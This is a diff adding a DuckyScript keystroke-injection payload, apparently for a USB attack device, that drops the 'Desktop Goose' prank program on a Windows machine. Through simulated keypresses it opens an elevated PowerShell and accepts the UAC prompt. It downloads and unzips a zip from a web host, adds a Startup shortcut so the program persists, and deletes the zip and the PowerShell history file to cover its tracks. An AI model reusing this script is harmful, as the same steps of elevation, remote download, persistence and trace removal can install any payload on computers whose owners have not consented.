@@ -1,0 +1,32 @@
+REM Open Run dialog
+GUI r
+DELAY 500
+REM Open PowerShell as admin
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 3500
+LEFTARROW
+ENTER
+REM DELAY 3500
+DELAY 2000
+REM Download goose.zip
+STRING Invoke-WebRequest -Uri "https://blindman51.github.io/files/goose.zip" -OutFile "C:\Program Files\goose.zip"
+ENTER
+REM DELAY 3000
+DELAY 500
+REM Unzip goose.zip
+STRING Expand-Archive -Path "C:\Program Files\goose.zip" -DestinationPath "C:\Program Files\goose" -Force
+ENTER
+REM DELAY 2000
+DELAY 500
+REM Create shortcut in Startup
+STRING $s=(New-Object -COM WScript.Shell).CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Goose.lnk");$s.TargetPath="C:\Program Files\goose\GooseDesktop.exe";$s.Save()
+ENTER
+DELAY 500
+REM Delete goose.zip
+STRING Remove-Item "C:\Program Files\goose.zip" -Force
+ENTER
+STRING Remove-Item "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
+ENTER
+STRING exit
+ENTER
